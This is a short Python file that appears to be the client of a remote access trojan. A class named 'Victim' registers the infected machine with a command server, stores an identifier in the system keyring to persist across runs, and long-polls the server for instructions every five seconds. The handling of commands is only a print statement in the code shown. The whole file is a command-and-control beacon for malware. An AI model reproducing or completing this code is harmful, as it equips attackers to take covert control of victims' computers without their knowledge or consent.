import asyncio
import os
import time

import requests
from keyring import set_password, get_password, delete_password
import CONFIG


class Victim:
    def __init__(self):
        self.service_name = "rat"
        self.username = "my_uniq_number"
        self.uniq_number = get_password(self.service_name, self.username)

    def register_or_login(self):
        # uniq_code = get_password(self.service_name, self.username)
        if not(self.uniq_number):
            r = requests.post(f"{CONFIG.host}/register_victim",
                          json={
                              "pc_name": "123456"
                          })
            set_password(self.service_name, self.username, str(r.content))
        else:
            # uniq_number = get_password(self.service_name, self.username)
            requests.post(f"{CONFIG.host}/login_victim",
                              json={
                                  "unique_number": self.uniq_number
                              })
        self.uniq_number = get_password(self.service_name, self.username)

    def delete_pass(self):
        delete_password(self.service_name, self.username)
        return "ok"

    async def longpooling_requests(self):
        time_ = 5
        while True:
            print("request")
            try:
                r = requests.post(f"{CONFIG.host}/longpool",
                                  json={
                                      "unique_number": self.uniq_number
                                  }, timeout=time_)
                if r.content:
                    print(r.content)
            except requests.exceptions.ReadTimeout:
                pass
            await asyncio.sleep(time_)
        # print(r.content)


v = Victim()
# v.delete_pass()
v.register_or_login()


if os.name == 'nt':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

if __name__ == "__main__":
    asyncio.run(v.longpooling_requests())
